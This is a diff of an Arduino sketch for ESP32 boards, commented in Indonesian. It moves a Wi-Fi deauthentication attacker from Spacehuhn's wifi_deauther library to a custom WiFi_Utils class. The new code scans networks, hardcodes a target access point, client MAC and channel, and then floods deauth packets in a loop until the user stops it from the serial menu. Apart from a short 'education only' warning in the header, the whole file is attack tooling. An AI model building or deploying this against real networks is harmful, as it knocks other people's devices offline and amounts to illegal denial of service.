@@ -1,122 +1,143 @@
 /*
- *  Contoh Kode Deauther Sederhana untuk ESP32-S2/S3
+ *  Contoh Penggunaan Kelas WiFi_Utils Kustom
  *  
  *  PERINGATAN: Gunakan hanya untuk edukasi dan pada jaringan yang Anda miliki.
  *  Penggunaan pada jaringan orang lain adalah ILEGAL.
- *  
- *  Library yang dibutuhkan: "wifi_deauther" oleh Spacehuhn
- *  Instal melalui Library Manager di Arduino IDE.
  */
 
 #include <Arduino.h>
-#include <wifi_deauther.h>
+#include <string>
+#include "wifi_utils.h" // Sertakan header kustom Anda
 
-// Buat objek Deauther
-Deauther deauther;
+// Buat objek dari kelas WiFi_Utils
+// true = gunakan MAC address acak
+WiFi_Utils wifi_util(true);
 
-// Fungsi untuk menampilkan menu di Serial Monitor
-void printMenu() {
-  Serial.println("\n--- Menu Deauther ---");
-  Serial.println("1: Scan Jaringan Wi-Fi");
-  Serial.println("2: Pilih Target (jaringan)");
-  Serial.println("3: Mulai Serangan");
-  Serial.println("s: Hentikan Serangan");
-  Serial.println("-----------------------");
-  Serial.print("Masukkan perintah: ");
-}
+// Variabel untuk menyimpan target
+bool isAttacking = false;
+uint8_t target_ap_bssid[6];
+uint8_t target_client_mac[6];
+int target_channel = 1;
 
 void setup() {
-  // Memulai komunikasi serial
   Serial.begin(115200);
   delay(1000);
-  Serial.println("Memulai...");
 
-  // Memulai library Deauther.
-  // LED_BUILTIN akan berkedip saat serangan berlangsung.
-  deauther.begin(LED_BUILTIN);
+  // Inisialisasi sistem Wi-Fi
+  wifi_util.init();
 
   Serial.println("Sistem siap. Gunakan Serial Monitor untuk mengontrol.");
   printMenu();
 }
 
 void loop() {
-  // Library ini perlu di-"update" secara berkala di loop utama
-  // untuk memproses paket dan menjalankan serangan.
-  deauther.update();
+  // Logika serangan
+  if (isAttacking) {
+    // Ubah channel sebelum mengirim paket
+    esp_wifi_set_channel(target_channel, WIFI_SECOND_CHAN_NONE);
+    
+    // Kirim paket deauth secara terus-menerus
+    wifi_util.sendDeauthPacket(target_ap_bssid, target_client_mac);
+    
+    // LED built-in berkedip untuk indikator serangan
+    digitalWrite(LED_BUILTIN, HIGH);
+    delay(1);
+    digitalWrite(LED_BUILTIN, LOW);
+  }
 
-  // Periksa apakah ada input dari Serial Monitor
+  // Proses input dari Serial Monitor
   if (Serial.available() > 0) {
     char input = Serial.read();
-    Serial.println(input); // Echo input pengguna
+    Serial.println(input);
+
+    // Hentikan serangan jika ada input baru
+    if (isAttacking) {
+      isAttacking = false;
+      Serial.println("[INFO] Serangan dihentikan.");
+    }
 
     switch (input) {
       case '1': // Scan jaringan
-        Serial.println("\n[INFO] Memulai scan jaringan...");
-        deauther.scan();
-        // Tunggu hingga scan selesai
-        while (deauther.isScanning()) {
-          deauther.update();
-          delay(10);
-        }
-        Serial.println("[INFO] Scan selesai.");
-        
-        // Tampilkan hasil scan
-        if (deauther.getNetworkCount() > 0) {
-          Serial.println("\n--- Jaringan Ditemukan ---");
-          for (int i = 0; i < deauther.getNetworkCount(); i++) {
-            Serial.print((String)(i + 1) + ": ");
-            Serial.print(deauther.getNetworkSSID(i));
-            Serial.print(" (CH: ");
-            Serial.print(deauther.getNetworkChannel(i));
-            Serial.print(", RSSI: ");
-            Serial.print(deauther.getNetworkRSSI(i));
-            Serial.println(" dBm)");
-          }
-        } else {
-          Serial.println("[INFO] Tidak ada jaringan ditemukan.");
-        }
+        wifi_util.scanWifiList();
+        printScanResults();
         printMenu();
         break;
 
-      case '2': // Pilih target
-        Serial.print("\nMasukkan nomor jaringan target: ");
-        while (!Serial.available()) {
-          delay(10);
-        }
-        int targetIndex = Serial.parseInt();
-        Serial.println(targetIndex);
+      // Di sini Anda perlu logika untuk memilih AP dan Klien
+      // Untuk contoh ini, kita akan hardcode target
+      case '2': // Set target (hardcoded untuk contoh)
+        // Ganti dengan MAC Address AP target Anda
+        // Format: XX:XX:XX:XX:XX:XX
+        parseMac("AA:BB:CC:DD:EE:FF", target_ap_bssid);
+        // Ganti dengan MAC Address salah satu klien yang terhubung
+        parseMac("11:22:33:44:55:66", target_client_mac);
+        target_channel = 6; // Ganti dengan channel AP target
 
-        // Validasi input
-        if (targetIndex > 0 && targetIndex <= deauther.getNetworkCount()) {
-          deauther.selectNetwork(targetIndex - 1); // Index dimulai dari 0
-          Serial.println("[INFO] Target dipilih: " + deauther.getNetworkSSID(targetIndex - 1));
-        } else {
-          Serial.println("[ERROR] Nomor jaringan tidak valid.");
-        }
+        Serial.println("[INFO] Target telah diset (hardcoded).");
+        Serial.print("AP BSSID: "); printMac(target_ap_bssid);
+        Serial.print("Client MAC: "); printMac(target_client_mac);
+        Serial.println("Channel: " + String(target_channel));
         printMenu();
         break;
 
       case '3': // Mulai serangan
-        if (deauther.getSelectedNetwork() >= 0) {
-          Serial.println("[INFO] Memulai serangan deauth terhadap semua perangkat di jaringan " + deauther.getNetworkSSID(deauther.getSelectedNetwork()));
-          deauther.start(); // Memulai serangan
+        if (memcmp(target_ap_bssid, "\0\0\0\0\0\0", 6) != 0) {
+          Serial.println("[INFO] Memulai serangan...");
+          isAttacking = true;
         } else {
-          Serial.println("[ERROR] Tidak ada target yang dipilih. Pilih jaringan terlebih dahulu (menu 2).");
+          Serial.println("[ERROR] Target belum diset. Pilih target terlebih dahulu (menu 2).");
         }
-        printMenu();
-        break;
-
-      case 's': // Hentikan serangan
-      case 'S':
-        deauther.stop();
-        Serial.println("[INFO] Serangan dihentikan.");
-        printMenu();
         break;
 
       default:
-        Serial.println("[ERROR] Perintah tidak dikenali.");
         printMenu();
         break;
     }
   }
+}
+
+// --- Fungsi Bantuan ---
+
+void printMenu() {
+  Serial.println("\n--- Menu Deauther Kustom ---");
+  Serial.println("1: Scan Jaringan Wi-Fi");
+  Serial.println("2: Set Target (hardcoded untuk contoh)");
+  Serial.println("3: Mulai Serangan");
+  Serial.println("Karakter apapun: Hentikan Serangan");
+  Serial.println("-------------------------------");
+  Serial.print("Masukkan perintah: ");
+}
+
+void printScanResults() {
+  if (wifi_util.wifi_list.num == 0) {
+    Serial.println("Tidak ada jaringan ditemukan.");
+    return;
+  }
+  Serial.println("\n--- Jaringan Ditemukan ---");
+  for (int i = 0; i < wifi_util.wifi_list.num; i++) {
+    Serial.print((String)(i + 1) + ": ");
+    Serial.print(wifi_util.wifi_list.ssid[i]);
+    Serial.print(" (");
+    Serial.print(wifi_util.wifi_list.bssid[i]);
+    Serial.print(", CH: ");
+    Serial.print(wifi_util.wifi_list.channel[i]);
+    Serial.println(")");
+  }
+}
+
+// Fungsi untuk mengkonversi string MAC ke array uint8_t
+void parseMac(String macStr, uint8_t* mac) {
+  for (int i = 0; i < 6; ++i) {
+    mac[i] = strtol(macStr.substring(i * 3, i * 3 + 2).c_str(), NULL, 16);
+  }
+}
+
+// Fungsi untuk mencetak array MAC ke Serial
+void printMac(const uint8_t* mac) {
+  for (int i = 0; i < 6; ++i) {
+    if (mac[i] < 16) Serial.print("0");
+    Serial.print(mac[i], HEX);
+    if (i < 5) Serial.print(":");
+  }
+  Serial.println();
 }
